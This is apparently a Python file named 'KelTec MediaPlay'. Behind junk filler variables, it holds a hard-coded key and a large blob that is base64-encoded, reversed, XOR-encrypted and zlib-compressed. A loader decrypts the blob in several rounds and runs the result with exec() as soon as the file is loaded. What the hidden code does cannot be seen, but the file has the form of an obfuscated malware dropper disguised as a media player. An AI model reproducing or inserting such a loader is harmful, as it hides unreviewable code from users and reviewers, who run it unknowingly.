# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 320391 ^ 369387
_lx1_1 = len("c30d78")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-628139)
_lx3_3 = 511867 * 0
_lx4_4 = 641483 ^ 566697
_K = 'b00a1fe4207a7b76b8f4c73da2e2c73bf8895b0dd9eb204213b73faf34d0eb97'
_M = '8ARrhc9G5myAJo+hzde1wEkkIRlt3QZ0ypVLnwgygdD6AGWOl1zkYIkl0/ae0eOUHytzGTnWBiXMmByaBzPR0KFXY9GVWOBvjyLX'
_D = '==Ay00bDg5zccxzWGAhbb/0RXZp4FGsk7mFtMlxCSL/bqpCbRbPC92oyReGcJ3wSNjj+2nuh0TI/BqKbxM1P3sltepI9gsY8xErmrFptDLJyfWkNmEcuFn/qk7XZJ86U0eUDjVQkHx3CTV4aixgDuqCo9mhrNAU6Nz0ZEqy83BSy9YvkXhwyiIFMbbVEzTQW2i0aQB786al/0+zipuHe5cX7meHjMjSPSdqLcQzTkP/mDHNLOm2yBnaLaeCbboI31TQ2DKoJ/oX4UKXCw962vxVaLKIxKsiAaCli5n1RLguabXcDEd2UyymIGMIEXgzsna4BKaKWG630fHB7nyjMpsmTwpPS8XlsSC6xt2t+agjGgEDnv9/OaDn2SJOQEOBE5dxL/OkVL4FroiEWxg+q2tsCBNRwYwzpmurzk3GdoolZvrMPnkkIED52Ht8690ozhztPONQAK1KEcPh9ZNbLvuvS7qaxCzgjnkmRWPQSFydroFDHp6Jvu2UQYGPhIL+sjm7CB9vLtKwuzBt4/FgXvFA6twwXzxo2EGb8toZ8u5stAxuGbIAXI8jDjG71jXyBu7kmoVV6ZtOrXdXlj0F5UlhwjJvcpCB2vmSJYuQovRjJUqkPxAsDocSvOiaIxAV5lNNfBuSgl7ZOPR5fIooJhE95pvmJnT+IgGTTddnRzECsQBCyNp0Nwc816nv4Q4pe/B0lY13HqpGVolwy5VIX5DJE69N/nsrirFBRW1cnv1hHCNRyzQBYAy3HTypwFTrcdD+9RCF9j100Kyvg58ySz7nBhAY8YV5KO0CQ8ywn3byccVdLiB37FAbLk+rmxjjAa+63dgOZ6+tTixo4r0/b5ISfOZX5fqoXEpNv53oVGyWS0/ZXHKuAjKsO3DagxintAAoJqfR7s6ccIIjDpHRrqBjZspSLExS4nLdmtnucxQ0xtrbbGvBJmXwN8U0tR8v/NWrDUVPcKwTh9+mvN+ODj1DqzAGk+EJm+IH/+17Vp4deNcZUlyEIzLQCKBkPkgCEJJHAxViitkzaNDiRvMN1t1Uge88WgYqyGqAB9tmSeNhY5OSkM71LX5T7OffOU4tGQ0PhVfgH+1npIG6CZH1wzA6MDgquoEFAJGXkMg1Mn0HwchVBUZydXBd3rSsCV7AjuR/mLrDrGm3q9QNiKZE8fCdBp5+T303lSXOz2wGInKrERnvDfoxdy2/ghMVayLAcXJam6mSxYmOv2deWDBKt1w5bzw9/XK/7p0kJiM3INWZPTJTB9XrnCWB/2ThYHHvzFf9UBfpzjX5H0p7BsEox0VsDz2dHseI/yvm9y2nkWq/u3j6QGIQVkFx4JXVfOGSup8aBidWeTpmL4vgw2Cke0F7xvfoHdPZkXPHK2HKwJ2ZkPoz/Ef6Hr6hVZ6yzM7jtk2ds/S8SE46YxohY15OzAvSli4hgBroscwI0PByqcE6XmihbkMlSafzvuQe59oHg4tyF/fbzW3O0lNjF5uySq/UAZr/DSyy7k9heNFeSEBbTzXjWGOsvQjSFPYrCfBWl3z1jMT+ubNBVqnjfjurYQdcCDZsQrJwku/XTKpSnBw6B3l3HySJopLkFgnoNmcCKZ4+nUoqrPHkGqdAKPQIRclM+lQaf7+8TX4L97nJqo/a0E38U6G70dxX6fNnpjc9k64DwRQSuJAclm5PwusNTTwHiWwO6fQT7ZW5D3sfDoJk0CoYe7zryAKhumqaeuGloTcUW8lrUEAxohACgzDxLdIagOOz0Y1kZRbp0aHAQyYH4TRIqgUjkMz2XxMQjlzAUX7dixgE7zGiowFn37HF3W3uVNuQ9OVvZke01DobCC5vx1GTfA17pDjV8j4PTXhll'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    exec(compile(src,'<mediaplay>','exec'),{'__name__':'__main__','__file__':__file__})
_run()